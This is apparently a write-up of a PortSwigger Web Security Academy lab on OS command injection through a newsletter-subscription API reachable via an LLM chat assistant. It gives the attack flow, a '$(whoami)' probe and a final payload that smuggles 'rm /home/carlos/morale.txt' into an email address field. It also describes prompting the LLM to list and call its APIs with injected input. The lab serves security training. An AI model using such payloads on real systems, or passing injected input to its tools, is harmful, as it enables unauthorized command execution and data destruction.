# Exploiting Vulnerabilities in LLM APIs

This project documents a PortSwigger Web Security Academy lab demonstrating **OS command injection through an LLM-accessible API**.

## Lab Information

- **Vulnerability:** OS Command Injection
- **Attack Surface:** LLM / Newsletter Subscription API
- **Difficulty:** Practitioner
- **Status:** Solved
- **Target:** `/home/carlos/morale.txt`

## Attack Flow

```text
Live Chat → LLM → Newsletter API → OS Command Injection → Command Execution
```

## Solution

Ask the LLM which APIs it can access and identify the **Newsletter Subscription API**.

Test the API with:

```text
attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Then test for command injection:

```bash
$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

If the resulting email is sent to `carlos@...`, command execution is confirmed.

### Final Payload

```bash
$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

This executes:

```bash
rm /home/carlos/morale.txt
```

The file is deleted and the lab is solved.

## Key Concept

An LLM-connected API can expose traditional vulnerabilities such as **OS command injection**. The LLM should not be treated as a security boundary.

## Security Takeaway

Use input validation, safe command execution, allowlists, authorization, and least-privilege access for APIs exposed to LLMs.
